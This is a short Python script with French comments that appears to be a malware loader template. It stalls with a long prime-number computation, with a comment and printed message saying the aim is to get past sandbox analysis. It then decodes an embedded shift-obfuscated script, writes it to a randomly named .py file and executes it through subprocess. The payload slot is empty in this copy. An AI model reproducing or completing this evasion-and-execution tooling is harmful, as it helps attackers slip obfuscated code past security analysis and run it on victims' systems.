import subprocess  # Importation de la bibliotheque subprocess pour executer des commandes systeme
import os          # Importation de la bibliotheque os pour effectuer des operations sur le systeme de fichiers

# Declaration d'une chaine de caracteres vide pour stocker le script modele obfusque qui serra executer
script_modele_obfusque = ""

# Initialisation de la derniere valeur de decalage
derniere_valeur_decalage = -2

try:
    # Definition d'une fonction pour verifier si un nombre est premier
    def est_premier(n):
        if n < 2:
            return False
        for i in range(2, int(n**0.5) + 1):
            if n % i == 0:
                return False
        return True

    # Recherche de nombres premiers dans une plage specifiee (evite d'utilise time)
    for nombre in range(2, 100000):
        if est_premier(nombre):
            print(f"bye sandbox : {nombre}", end="\r")

    # Definition d'une fonction pour deobfusquer un texte
    def deobfuscation(texte):
        texte_original = ""
        for caractere in texte:
            texte_original += chr(ord(caractere) - derniere_valeur_decalage)
        return texte_original

    # Desobfuscation du script modele
    template_original = deobfuscation(script_modele_obfusque)

    # Obtention du repertoire actuel ou le script est execute
    dossier_courant = os.getcwd()

    # Generation d'un nom de fichier pour le 'modele desobfusque'.py (evite d'utilise UUDI)
    def generer_aleatoire(longueur):
        alphabet = 'abcdefghijklmnopqrstuvwxyz'
        gen = ''
        for i in range(longueur):
            index = ord(os.urandom(1)) % len(alphabet)
            gen += alphabet[index]
        return gen
    
    nom_aleatoire = str(generer_aleatoire(10))
    nom = str("zit" + nom_aleatoire + ".py")

    # Chemin complet du fichier de sortie dans le repertoire courant
    nom_modele_desobfusque = os.path.join(dossier_courant, nom)

    # Enregistrement du modele desobfusque dans le fichier
    with open(nom_modele_desobfusque, "w", encoding="utf-8") as fichier_sortie:
        fichier_sortie.write(template_original)
    print(f"\n\n[+] Le 'modele desobfusque' a ete enregistre dans {nom_modele_desobfusque}.")

    # Execution du modele desobfusque en fonction du systeme d'exploitation
    if os.name == 'nt':
        subprocess.run(["python", nom_modele_desobfusque], check=True)
    elif os.name == 'posix':
        subprocess.run(["python3", nom_modele_desobfusque], check=True)
    else:
        print("[!] Le systeme d'exploitation n'est pas reconnu.")

except subprocess.CalledProcessError as e:
    print(f"\n[!] Erreur lors de l'execution du script : {str(e)}")
